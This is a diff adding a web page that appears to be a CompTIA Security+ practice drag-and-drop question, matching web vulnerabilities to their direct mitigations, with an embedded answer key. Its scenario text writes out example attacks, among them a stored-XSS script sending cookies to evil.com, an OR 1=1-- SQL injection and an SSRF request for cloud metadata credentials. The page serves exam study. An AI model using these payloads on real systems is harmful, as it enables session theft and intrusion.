@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>D2Q2 — Vulnerability-to-Mitigation Matching</title>
+<style>
+:root{--bg:#0d1117;--surface:#161b22;--surface2:#21262d;--border:#30363d;--text:#e6edf3;--muted:#8b949e;--blue:#1f6feb;--blue-lt:#388bfd;--purple:#8957e5;--green:#2ea043;--green-bg:#0d2318;--green-border:#196c2e;--red:#da3633;--red-bg:#1e0d0d;--red-border:#6e1a1a;--yellow:#d29922;--accent:#238636;}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;padding:0 0 80px;}
+.top-bar{display:flex;align-items:center;gap:12px;background:var(--surface);border-bottom:1px solid var(--border);padding:12px 24px;flex-wrap:wrap;}
+.badge{background:var(--purple);color:#fff;font-size:10px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;padding:3px 10px;border-radius:20px;white-space:nowrap;}
+.top-title{flex:1;font-size:13px;color:var(--muted);min-width:0;}
+.back-link{font-size:13px;color:var(--blue-lt);text-decoration:none;white-space:nowrap;}
+.back-link:hover{text-decoration:underline;}
+.page{max-width:960px;margin:0 auto;padding:32px 16px;}
+.scenario-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:24px;margin-bottom:24px;}
+.sc-title{font-size:18px;font-weight:700;margin-bottom:8px;}
+.tags{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:14px;}
+.tag{font-size:11px;font-weight:600;padding:2px 8px;border-radius:12px;letter-spacing:.04em;}
+.tag-domain{background:#1a2d4a;color:var(--blue-lt);border:1px solid #1f3d6b;}
+.tag-type{background:#1e1a2e;color:#b695f8;border:1px solid #3d2d6b;}
+.tag-diff.med{background:#1e1a0e;color:var(--yellow);border:1px solid #4a3800;}
+.scenario-box{background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:16px;margin-bottom:14px;font-size:14px;line-height:1.7;}
+.scenario-box strong{color:var(--blue-lt);}
+.instructions{font-size:13px;color:var(--muted);line-height:1.6;}
+.match-area{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:24px;}
+@media(max-width:640px){.match-area{grid-template-columns:1fr;}}
+.col-label{font-size:11px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);margin-bottom:10px;}
+.chip-pool{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:16px;display:flex;flex-direction:column;gap:8px;min-height:300px;}
+.chip{background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:10px 14px;font-size:13px;font-weight:700;color:var(--blue-lt);cursor:grab;user-select:none;transition:border-color .15s,opacity .15s;}
+.chip:hover{border-color:var(--blue-lt);}
+.chip.dragging{opacity:.4;}
+.chip.placed{opacity:.25;pointer-events:none;}
+.drop-zones{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:16px;display:flex;flex-direction:column;gap:10px;}
+.zone{background:var(--surface2);border:2px dashed var(--border);border-radius:8px;padding:10px 14px;min-height:64px;display:flex;align-items:center;font-size:13px;line-height:1.4;color:var(--text);transition:border-color .15s,background .15s;}
+.zone.drag-over{border-color:var(--blue-lt);background:#1a2540;}
+.zone-label{flex:1;padding-right:8px;}
+.zone-chip{background:var(--blue);color:#fff;border-radius:6px;padding:4px 10px;font-size:12px;font-weight:700;white-space:nowrap;cursor:grab;flex-shrink:0;}
+.zone.correct{border-color:var(--green-border);background:var(--green-bg);border-style:solid;}
+.zone.wrong{border-color:var(--red-border);background:var(--red-bg);border-style:solid;}
+.actions{display:flex;align-items:center;gap:12px;margin-bottom:24px;flex-wrap:wrap;}
+.btn-submit{background:var(--accent);color:#fff;border:none;border-radius:8px;padding:10px 24px;font-size:14px;font-weight:600;cursor:pointer;}
+.btn-submit:disabled{opacity:.4;cursor:not-allowed;}
+.btn-reset{background:transparent;color:var(--muted);border:1px solid var(--border);border-radius:8px;padding:10px 20px;font-size:14px;font-weight:600;cursor:pointer;}
+.btn-reset:hover{border-color:var(--muted);color:var(--text);}
+.score-badge{display:flex;align-items:center;gap:8px;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:8px 16px;font-size:14px;font-weight:700;}
+.explanation{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;display:none;}
+.exp-header{padding:14px 20px;background:var(--surface2);border-bottom:1px solid var(--border);font-size:13px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;color:var(--muted);}
+.exp-row{padding:14px 20px;border-bottom:1px solid var(--border);display:flex;gap:12px;align-items:flex-start;}
+.exp-icon{font-size:16px;flex-shrink:0;margin-top:1px;}
+.exp-content{flex:1;}
+.exp-alg{font-weight:700;font-size:13px;color:var(--blue-lt);margin-bottom:4px;}
+.exp-text{font-size:13px;color:var(--muted);line-height:1.6;}
+.exp-tip{margin:0 20px 20px;padding:14px 16px;background:#1a1f2e;border:1px solid #2a3a6e;border-radius:8px;font-size:13px;color:#a0b4e8;line-height:1.6;}
+.exp-tip strong{color:var(--blue-lt);}
+</style>
+</head>
+<body>
+<div class="top-bar">
+  <span class="badge">Performance-Based</span>
+  <span class="top-title">CompTIA Security+ SY0-701 · Domain 2: Threats, Vulnerabilities &amp; Mitigations · Web App Security</span>
+  <a class="back-link" href="index.html">← All Questions</a>
+</div>
+<div class="page">
+  <div class="scenario-card">
+    <div class="sc-title">Vulnerability-to-Mitigation Matching</div>
+    <div class="tags">
+      <span class="tag tag-domain">Domain 2</span>
+      <span class="tag tag-type">Drag &amp; Drop</span>
+      <span class="tag tag-diff med">Medium</span>
+    </div>
+    <div class="scenario-box">
+      A penetration testing firm has completed an assessment of <strong>Orion Retail's</strong> e-commerce
+      platform and identified five distinct vulnerability classes in the findings report. The development
+      lead must now assign a primary mitigation control to each vulnerability before the remediation
+      sprint begins. Each mitigation must be the most direct technical control that prevents the
+      specific class of attack — not a compensating control or a monitoring-only measure.
+    </div>
+    <div class="instructions">Drag each mitigation control from the left and drop it onto the vulnerability it most directly prevents. All five zones must be filled before submitting.</div>
+  </div>
+  <div class="match-area">
+    <div><div class="col-label">Mitigation Controls</div><div class="chip-pool" id="chipPool"></div></div>
+    <div><div class="col-label">Vulnerability Classes</div><div class="drop-zones" id="dropZones"></div></div>
+  </div>
+  <div class="actions">
+    <button class="btn-submit" id="btnSubmit" disabled>Submit Answer</button>
+    <button class="btn-reset" id="btnReset">Reset</button>
+    <span class="score-badge" id="scoreBadge" style="display:none;"></span>
+  </div>
+  <div class="explanation" id="explanation">
+    <div class="exp-header">Answer Explanations</div>
+    <div class="exp-tip" id="expTip"></div>
+  </div>
+</div>
+<script>
+const ITEMS=[
+  {id:'paramq',label:'Parameterized Queries',zoneId:'z-sqli',explanation:'Parameterized queries (prepared statements) separate SQL code from user-supplied data at the driver level. Because user input is never interpreted as SQL syntax, it is impossible to inject additional statements. This is the direct fix for SQL injection, unlike a WAF which is a compensating control.'},
+  {id:'csp',label:'Content Security Policy + Output Encoding',zoneId:'z-xss',explanation:'Output encoding converts special characters (< > " \') into their HTML entity equivalents before inserting data into a page, preventing the browser from interpreting injected content as script. CSP adds a second layer by allowlisting which script sources the browser is permitted to execute.'},
+  {id:'csrf',label:'SameSite=Strict Cookie + Anti-CSRF Token',zoneId:'z-csrf',explanation:'CSRF attacks trick an authenticated browser into sending a forged request. SameSite=Strict prevents the browser from attaching the session cookie on cross-origin requests. Anti-CSRF tokens add a secret value to each form that the server verifies — a forged request cannot include the correct token.'},
+  {id:'allowlist',label:'Server-Side Outbound Allowlist',zoneId:'z-ssrf',explanation:'SSRF lets an attacker cause the server to make requests to internal resources. A server-side allowlist of permitted outbound destinations (by IP range and hostname) directly prevents the server from fetching arbitrary internal or cloud metadata URLs, such as http://169.254.169.254/.'},
+  {id:'aslr',label:'Stack Canaries + ASLR',zoneId:'z-bof',explanation:'Stack canaries are random values placed before return addresses; if overwritten, the program terminates before the attacker gains control. ASLR randomises memory layout so even if a canary is bypassed, the attacker cannot reliably predict where injected shellcode or ROP gadgets reside.'},
+];
+const ZONES=[
+  {id:'z-sqli',label:'SQL Injection — Attacker appends OR 1=1-- to a login field, bypassing authentication and dumping the users table.'},
+  {id:'z-xss',label:'Stored XSS — Attacker posts a comment containing <script>document.location=\'https://evil.com?c=\'+document.cookie</script> that executes in every visitor\'s browser.'},
+  {id:'z-csrf',label:'CSRF — A malicious page visited by a logged-in user silently submits a POST to /transfer?amount=5000&to=attacker, using the victim\'s active session cookie.'},
+  {id:'z-ssrf',label:'SSRF — Attacker supplies http://169.254.169.254/latest/meta-data/ as an image URL; the server fetches it and returns AWS instance credentials in the response.'},
+  {id:'z-bof',label:'Buffer Overflow — Attacker sends a 600-byte string to a field that allocates only 256 bytes on the stack, overwriting the saved return address with shellcode.'},
+];
+const correctMap={};ITEMS.forEach(it=>correctMap[it.zoneId]=it.id);
+let chipSlot={};ZONES.forEach(z=>chipSlot[z.id]=null);
+let draggedId=null,submitted=false;
+function shuffle(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;}
+let chipOrder,zoneOrder;
+function init(){submitted=false;chipSlot={};ZONES.forEach(z=>chipSlot[z.id]=null);chipOrder=shuffle([...ITEMS]);zoneOrder=shuffle([...ZONES]);renderChips();renderZones();updateSubmit();document.getElementById('scoreBadge').style.display='none';document.getElementById('explanation').style.display='none';}
+function renderChips(){const pool=document.getElementById('chipPool');pool.innerHTML='';const placed=new Set(Object.values(chipSlot).filter(Boolean));chipOrder.forEach(item=>{const div=document.createElement('div');div.className='chip'+(placed.has(item.id)?' placed':'');div.textContent=item.label;div.dataset.itemId=item.id;div.draggable=!placed.has(item.id);div.addEventListener('dragstart',()=>{if(submitted)return;draggedId=item.id;setTimeout(()=>div.classList.add('dragging'),0);});div.addEventListener('dragend',()=>{div.classList.remove('dragging');draggedId=null;});div.addEventListener('touchstart',onTouchStart,{passive:false});pool.appendChild(div);});}
+function renderZones(){const container=document.getElementById('dropZones');container.innerHTML='';zoneOrder.forEach(zone=>{const div=document.createElement('div');div.className='zone';div.dataset.zoneId=zone.id;const label=document.createElement('span');label.className='zone-label';label.textContent=zone.label;div.appendChild(label);const placedId=chipSlot[zone.id];if(placedId){const item=ITEMS.find(i=>i.id===placedId);const chip=document.createElement('span');chip.className='zone-chip';chip.textContent=item.label;chip.dataset.itemId=placedId;chip.draggable=true;chip.addEventListener('dragstart',()=>{if(submitted)return;draggedId=placedId;chipSlot[zone.id]=null;renderChips();renderZones();updateSubmit();});chip.addEventListener('touchstart',onTouchStart,{passive:false});div.appendChild(chip);}
+if(!submitted){div.addEventListener('dragover',e=>{e.preventDefault();div.classList.add('drag-over');});div.addEventListener('dragleave',()=>div.classList.remove('drag-over'));div.addEventListener('drop',e=>{e.preventDefault();div.classList.remove('drag-over');if(!draggedId)return;Object.keys(chipSlot).forEach(zid=>{if(chipSlot[zid]===draggedId)chipSlot[zid]=null;});chipSlot[zone.id]=draggedId;draggedId=null;renderChips();renderZones();updateSubmit();});}
+container.appendChild(div);});}
+function updateSubmit(){document.getElementById('btnSubmit').disabled=(Object.values(chipSlot).filter(Boolean).length<ZONES.length)||submitted;}
+document.getElementById('btnSubmit').addEventListener('click',()=>{if(submitted)return;submitted=true;document.getElementById('btnSubmit').disabled=true;let correct=0;document.querySelectorAll('.zone').forEach(zoneEl=>{const zid=zoneEl.dataset.zoneId;const ok=chipSlot[zid]===correctMap[zid];if(ok)correct++;zoneEl.classList.add(ok?'correct':'wrong');});const total=ZONES.length,pct=Math.round(correct/total*100);const badge=document.getElementById('scoreBadge');badge.style.display='flex';badge.innerHTML=`<span style="font-size:18px">${pct>=70?'✅':'❌'}</span><span>${correct}/${total} correct (${pct}%)</span><span style="color:var(--muted);font-weight:400;font-size:12px">${pct>=70?' — PASS':' — BELOW PASSING'}</span>`;const expPanel=document.getElementById('explanation');expPanel.style.display='block';const tip=document.getElementById('expTip');zoneOrder.forEach(zone=>{const placedId=chipSlot[zone.id];const correctId=correctMap[zone.id];const correctItem=ITEMS.find(i=>i.id===correctId);const placedItem=ITEMS.find(i=>i.id===placedId);const ok=placedId===correctId;const row=document.createElement('div');row.className='exp-row';row.innerHTML=`<span class="exp-icon">${ok?'✅':'❌'}</span><div class="exp-content"><div class="exp-alg">${correctItem.label}${!ok?` <span style="color:var(--muted);font-weight:400;font-size:12px;">(you chose: ${placedItem?placedItem.label:'nothing'})</span>`:''}</div><div class="exp-text">${correctItem.explanation}</div></div>`;expPanel.insertBefore(row,tip);});tip.innerHTML=`<strong>Exam Tip:</strong> Security+ distinguishes <em>direct</em> mitigations from <em>compensating</em> controls. A WAF can block SQLi attempts but does not fix the root cause — parameterized queries do. Similarly, input validation alone doesn't prevent CSRF (the request is legitimate, just unauthorized). Know OWASP Top 10 mitigations by category: input handling (SQLi/XSS), request forgery (CSRF), server-side request forgery (SSRF), and memory safety (buffer overflow).`;expPanel.scrollIntoView({behavior:'smooth',block:'start'});});
+document.getElementById('btnReset').addEventListener('click',()=>{document.querySelectorAll('.exp-row').forEach(r=>r.remove());document.getElementById('expTip').innerHTML='';init();});
+let touchClone=null,touchItemId=null,touchOffsetX=0,touchOffsetY=0;
+function onTouchStart(e){if(submitted)return;e.preventDefault();const touch=e.touches[0];const src=e.currentTarget;touchItemId=src.dataset.itemId;Object.keys(chipSlot).forEach(zid=>{if(chipSlot[zid]===touchItemId)chipSlot[zid]=null;});renderChips();renderZones();updateSubmit();const rect=src.getBoundingClientRect();touchOffsetX=touch.clientX-rect.left;touchOffsetY=touch.clientY-rect.top;touchClone=src.cloneNode(true);touchClone.style.cssText=`position:fixed;top:${rect.top}px;left:${rect.left}px;width:${rect.width}px;pointer-events:none;z-index:9999;opacity:.85;`;document.body.appendChild(touchClone);document.addEventListener('touchmove',onTouchMove,{passive:false});document.addEventListener('touchend',onTouchEnd);}
+function onTouchMove(e){e.preventDefault();const touch=e.touches[0];touchClone.style.top=(touch.clientY-touchOffsetY)+'px';touchClone.style.left=(touch.clientX-touchOffsetX)+'px';document.querySelectorAll('.zone').forEach(z=>z.classList.remove('drag-over'));const el=document.elementFromPoint(touch.clientX,touch.clientY);const zone=el&&el.closest('.zone');if(zone)zone.classList.add('drag-over');}
+function onTouchEnd(e){document.removeEventListener('touchmove',onTouchMove);document.removeEventListener('touchend',onTouchEnd);if(touchClone){touchClone.remove();touchClone=null;}const touch=e.changedTouches[0];const el=document.elementFromPoint(touch.clientX,touch.clientY);const zoneEl=el&&el.closest('.zone');document.querySelectorAll('.zone').forEach(z=>z.classList.remove('drag-over'));if(zoneEl&&touchItemId){const zid=zoneEl.dataset.zoneId;Object.keys(chipSlot).forEach(z=>{if(chipSlot[z]===touchItemId)chipSlot[z]=null;});chipSlot[zid]=touchItemId;}touchItemId=null;renderChips();renderZones();updateSubmit();}
+init();
+</script>
+</body>
+</html>
